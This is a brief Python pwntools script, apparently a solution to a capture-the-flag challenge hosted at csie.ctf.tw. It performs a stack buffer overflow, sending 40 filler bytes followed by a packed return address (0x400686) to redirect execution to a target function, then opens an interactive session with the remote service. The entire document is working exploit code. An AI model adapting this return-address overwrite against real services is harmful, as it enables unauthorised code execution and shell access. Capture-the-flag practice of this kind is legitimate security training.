from pwn import *

# host = '127.0.0.1'
# port = 8888
host = 'csie.ctf.tw'
port = 10125

r = remote(host, port)

www = 0x0000000000400686
# payload = str.encode(cyclic(40))
payload = b'a'*40
payload += p64(www)

# input('press enter')
r.sendline(payload)

r.interactive()
